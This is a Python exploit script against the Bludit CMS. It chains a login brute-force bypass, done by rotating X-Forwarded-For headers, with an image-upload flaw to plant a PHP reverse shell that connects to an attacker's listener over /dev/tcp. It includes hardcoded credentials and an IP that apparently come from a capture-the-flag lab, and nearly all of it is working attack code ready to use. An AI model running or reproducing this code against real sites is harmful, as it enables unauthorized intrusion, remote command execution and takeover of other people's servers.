import re
import requests
import sys
import time
import string
import random


def banner():
    return """
     _____      _    ______  _____  _____
    |  __ \    | |   | ___ \/  __ \|  ___|
    | |  \/ ___| |_  | |_/ /| /  \/| |__
    | | __ / _ \ __| |    / | |    |  __|
    | |_\ \  __/ |_ _| |\ \ | \__/\| |___
     \____/\___|\__(_)_| \_| \____/\____/

    This exploit combines CVE-2019-17240 & CVE-2019-16113 to gain remote shell on target.

    Created by: kisho64 (@h_a_m_i__)
    """
print(banner())

get_target = input("Enter target URL (i.e. https://target.com): ")
listener_ip = input("[ ~ ] Enter listener's IP: ")
listener_port = input("[ ~ ] Enter listener's port: ")

payload_php = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1'");"""
payload_name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10)) + '.php'
htaccess = 'RewriteEngine on\nRewriteRule ^.*$ -'

def check_target(target):
    status = None
    try:
        check = requests.get(target, timeout=6)
        if check.status_code == 200:
            status = True
        else:
            status = False
    except:
        status = False
    return status


def main():
    """
    This function makes calls to other functions and pretty much does everything needed to get this exploit up and running.
    """

    target_url = get_target + '/admin/login'
    upload_url = get_target + '/admin/ajax/upload-images'
    csrf_token = get_target + '/admin/new-content'
    shell_url = get_target + '/bl-content/tmp/' + payload_name

    print("[...] Checking if the target is live...")

    if check_target(get_target) == False:
        print("[ ! ] The target seems to be down, exiting...")
        sys.exit()
    if check_target(get_target) == True:
        print("[ + ] The target is live! We are good to go...")
        print()

        bruteforce_username = 'N' # input("[ ~ ] Should I bruteforce username? [Y/N]: ")

        if bruteforce_username == 'N':
            get_username = 'fergus' # input("[ ~ ] What username should I use? (leave this to use admin as username): ")
            if get_username == '':
                print("[...] We are gonna default to 'admin' as username.")
                time.sleep(1)
                print()
                passwd_list = input("[ ~ ] Enter the location for password list: ")
                hacked_pass = password_bruteforce(target=target_url, wordlist=passwd_list, username='admin')
                print(login(target=target_url, username='admin', password=hacked_pass))
                print()

                shell_upload(payload=payload_php, payload_name=payload_name, target=upload_url, grab_csrf=csrf_token)
                shell_upload(payload=htaccess, payload_name='.htaccess', target=upload_url, grab_csrf=csrf_token)
                print()
                open_shell(shell_url=shell_url)

            if get_username != '':
                # passwd_list = input("[ ~ ] Enter the location for password list: ")
                # print()
                # hacked_pass = password_bruteforce(target=target_url, wordlist=passwd_list, username=get_username)
                hacked_pass = "RolandDeschain" 
                print()
                print("[...] Attempting to login now...")
                time.sleep(2)
                print(login(target=target_url, username=get_username, password=hacked_pass))
                print()

                shell_upload(payload=payload_php, payload_name=payload_name, target=upload_url, grab_csrf=csrf_token)
                shell_upload(payload=htaccess, payload_name='.htaccess', target=upload_url, grab_csrf=csrf_token)
                print()
                print(open_shell(shell_url=shell_url))

        if bruteforce_username == 'Y':
            usernames = input("[ ~ ] Enter the location for username wordlist: ")
            passwords = input("[ ~ ] Enter the location for password wordlist: ")
            print()
            user_pass = user_pass_bruteforce(target=target_url, user_wordlist=usernames, pass_wordlist=passwords)
            print()
            print("[...] Attempting to login now...")
            time.sleep(1)
            print(login(target=target_url, username=user_pass[0], password=user_pass[1]))
            print()

            shell_upload(payload=payload_php, payload_name=payload_name, target=upload_url, grab_csrf=csrf_token)
            shell_upload(payload=htaccess, payload_name='.htaccess', target=upload_url, grab_csrf=csrf_token)
            print()
            open_shell(shell_url=shell_url)


def password_bruteforce(username, target, wordlist):
    file = open(wordlist).readlines()
    passwd = ''

    for password, num in zip(file, range(len(file))):
        try:
            session = requests.Session()
            bludit_login = session.get(target)
            get_csrf_token = re.search(r'tokenCSRF" value="(.*?)"', str(bludit_login.text)).group(1)

            headers = {'X-Forwarded-For': str(num), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36', 'Referer': "http://10.10.10.191/admin/"}
            data = {'tokenCSRF': get_csrf_token, 'username': username, 'password': password.strip()}

            send_data = session.post(target, headers=headers, data=data, allow_redirects=False)

            print(f"[ * ] Tried: {password.strip()}")
            if 'location' in send_data.headers:
                if '/admin/dashboard' in send_data.headers['location']:
                    print(f"[ + ] Creds found: {username}:{password.strip()}")
                    passwd += password.strip()
                    break

        except:
            pass
    return passwd


def user_pass_bruteforce(target, user_wordlist, pass_wordlist):
    usernames = open(user_wordlist).readlines()
    passwords = open(pass_wordlist).readlines()
    creds = ''

    for username in usernames:
        for password, num in zip(passwords, range(len(passwords) + len(usernames))):
            try:
                session = requests.Session()
                bludit_login = session.get(target)
                get_csrf_token = re.search(r'tokenCSRF" value="(.*?)"', str(bludit_login.text)).group(1)

                headers = {'X-Forwarded-For': str(num), 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36', 'Referer': "http://10.10.10.191/admin/"}
                data = {'tokenCSRF': get_csrf_token, 'username': username.strip(), 'password': password.strip()}

                send_data = session.post(target, headers=headers, data=data, allow_redirects=False)
                print(f"[ * ] Tried: {username.strip()}:{password.strip()}")
                if 'location' in send_data.headers:
                    if '/admin/dashboard' in send_data.headers['location']:
                        print(f"[ + ] Creds found: {username.strip()}:{password.strip()}")

                        return (username.strip(), password.strip())
            except:
                pass



session = requests.Session()

def get_csrf_token(target):
    request = session.get(target)
    csrf_token = re.search(r'tokenCSRF" value="(.*?)"', str(request.text)).group(1)
    return csrf_token


def login(target, username, password):
    csrf_token = get_csrf_token(target)

    login_status = ''
    try:
        request = session.post(target, data={'tokenCSRF':csrf_token, 'username': username, 'password': password})
        if re.search(r"<title>Bludit - Dashboard</title>", str(request.text)):
            login_status += "[ + ] Login succeed... We are good to go :)"
        else:
            login_status += "[ - ] Login failed, make sure the credentials are correct, exiting..."
            sys.exit()

    except Exception as e:
        print("[ ! ] ERROR: ", e)
        sys.exit()

    return login_status


def shell_upload(payload, payload_name, target, grab_csrf):
    csrf_token = get_csrf_token(grab_csrf)

    upload_shell = {'images[]': (payload_name, payload), 'uuid': (None, ''), 'tokenCSRF': (None, csrf_token)}
    try:
        send_file = session.post(target, files=upload_shell)
        if send_file.status_code == 200:
            print(f"[ + ] The payload {payload_name} has been uploaded...")
        else:
            print(f"[ !] Something went wrong with uploading {payload_name}")
    except Exception as e:
        print(f"[ ! ] ERROR: {e}")
        sys.exit()


def open_shell(shell_url):
    print(f"[...] Attempting to get a shell... @ {shell_url}")
    try:
        requests.get(shell_url, timeout=10)
    except requests.exceptions.Timeout:
        print(f"[ + ] You should be getting a shell by now, if not open {shell_url}")
        sys.exit()


if __name__ == '__main__':
    main()
